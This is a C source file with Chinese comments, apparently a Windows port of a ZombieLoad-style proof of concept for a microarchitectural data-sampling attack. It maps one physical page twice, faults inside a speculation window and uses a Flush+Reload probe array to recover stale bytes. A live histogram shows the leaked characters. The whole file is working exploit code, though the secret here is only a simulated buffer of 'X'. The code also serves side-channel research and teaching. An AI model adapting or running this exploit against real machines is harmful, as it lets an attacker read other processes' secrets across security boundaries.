#define _GNU_SOURCE 1
// 启用 GNU 扩展（如某些 POSIX 函数），Windows 下 MinGW 编译时可能不需要，但保留兼容性

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
// 引入 Windows API（如 CreateFileMapping、MapViewOfFile），用于创建共享内存映射

#include "cacheutils_win.h"
// 引入缓存工具头文件，包含 Flush+Reload、rdtsc、clflush、maccess 等微架构侧信道函数

#define FROM 'A'
// 直方图统计范围起点（字母 A）
#define TO 'Z'
// 直方图统计范围终点（字母 Z）

char __attribute__((aligned(4096))) mem[256 * 4096];
// 探针数组（probe array），大小 256 个页面，每个页面 4096 字节，对齐到页面边界
// 用于 Flush+Reload 编码泄漏的字节值（0-255 对应 ASCII）

char __attribute__((aligned(4096))) mapping[4096];
// 共享内存的第二个映射，用于触发微码辅助（Accessed bit 被清零时访问会触发）

char __attribute__((aligned(4096))) secret[4096 * 1024];
// 模拟受害者加载的秘密数据（大小 4MB），在实际攻击中由受害者进程不断访问
// 这里初始化为 'X'，用于测试是否能泄漏 'X'

size_t hist[256];
// 直方图数组，统计每个字节（0-255）被 Flush+Reload 命中的次数

void recover(void);
// 函数声明：从缓存状态恢复泄漏值并更新直方图

int main(int argc, char *argv[])
{
    /* Initialize and flush LUT */
    // 初始化探针数组 mem 为 0，并清空所有 256 个页面的缓存（防止干扰）
    memset(mem, 0, sizeof(mem));
    for (size_t i = 0; i < 256; i++) {
        flush(mem + i * 4096);  // 使用 cacheutils_win.h 中的 clflush 指令清空缓存
    }

    /* Initialize mapping */
    // 初始化共享内存映射页面为 0
    memset(mapping, 0, 4096);

    // 计算 Flush+Reload 的缓存缺失阈值（动态检测当前机器的缓存命中/缺失时间差）
    CACHE_MISS = detect_flush_reload_threshold();
    fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (int)CACHE_MISS);
    // 输出阈值，用于调试（一般 100-200 cycles 左右）

    // 使用 Windows API 创建一个命名共享内存映射（大小 4096 字节，名为 "LBLEAK"）
    HANDLE hFile = CreateFileMapping((HANDLE) -1, NULL, PAGE_READWRITE, 0, 4096, "LBLEAK");
    if(hFile == NULL) {
        printf("[!] Create mapping failed\n");
        return 1;
    }

    // 创建两个映射视图：map1 可写，map2 只读（但实际都映射同一物理页面）
    // 这是变体3 的核心：两个虚拟地址映射同一物理页，用于触发微码辅助
    char* map1 = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, 4096);
    char* map2 = MapViewOfFile(hFile, FILE_MAP_READ, 0, 0, 4096);
    
    // 初始化 map1[0] = 0，检查 map2[0] 是否同步（验证共享内存成功）
    map1[0] = 0;
    if(map2[0] != 0) {
        printf("[!] Could not create shared memory\n");
        return 1;
    }

    // 初始化秘密数组为 'X'（模拟受害者不断加载的秘密字符）
    memset(secret, 'X', sizeof(secret));

    // 主循环：不断尝试泄漏
    while (true) {
#if 0
        // enable to test leakage on same core
        // 如果取消注释，用于测试同一核心泄漏（非超线程）
        for(int i = 0; i < 64 * 1024; i++) maccess(secret + i * 64);
        mfence();
#endif

        /* Flush mapping */
        // 清空 map1 的缓存，确保下次访问 map2 时必须走内存（触发 LFB + 微码辅助）
        flush(map1);

        /* Begin speculation and recover value */
        // 开始瞬态执行窗口（speculation window）
        // 使用 cacheutils_win.h 中的宏：speculation_start(s) ... speculation_end(s)
        // 这是自定义的瞬态执行 gadget（类似 Spectre 的分支误预测）
        speculation_start(s);
            maccess(0);                     // 故意访问地址 0（触发故障/异常）
            maccess(mem + 4096 * map2[0]);  // 关键：瞬态访问 map2[0]，如果 map2[0] 是 'X'，就会瞬态访问 mem + 4096*'X'
                                            // 因为 map2[0] 被受害者加载过陈旧值 'X'，故障时 CPU 先用错值计算
        speculation_end(s);

        // 从缓存状态恢复泄漏值，更新直方图
        recover();
    }

    return 0;
}

// 恢复函数：通过 Flush+Reload 测量探针数组 mem 的缓存命中情况
void recover(void) {
    /* Recover value from cache and update histogram */
    bool update = false;
    // 只统计 A-Z（ASCII 65-90）
    for (size_t i = FROM; i <= TO; i++) {
        // Flush+Reload：如果 mem + 4096*i 被瞬态访问过（缓存命中），则认为泄漏了字符 i
        if (flush_reload((char*) mem + 4096 * i)) {
            hist[i]++;          // 该字符计数 +1
            update = true;      // 有更新，需要重绘直方图
        }
    }

    /* Redraw histogram on update */
    // 只要有任何字符命中，就清屏并重绘直方图（Windows 下用 system("cls") 清屏）
    if (update == true) {
        system("cls");  // 清屏（Windows cmd）
        int max = 1;
        // 找到最大计数，用于归一化显示
        for (int i = FROM; i <= TO; i++) {
            if (hist[i] > max) {
                max = hist[i];
            }
        }
        // 打印 A-Z 的直方图：字符 + 计数 + 可视化条形（# 表示比例）
        for (int i = FROM; i <= TO; i++) {
            printf("%c: (%4u) ", i, (unsigned int)hist[i]);
            for (int j = 0; j < hist[i] * 60 / max; j++) {
                printf("#");
            }
            printf("\n");
        }
        fflush(stdout);  // 强制刷新输出
    }
}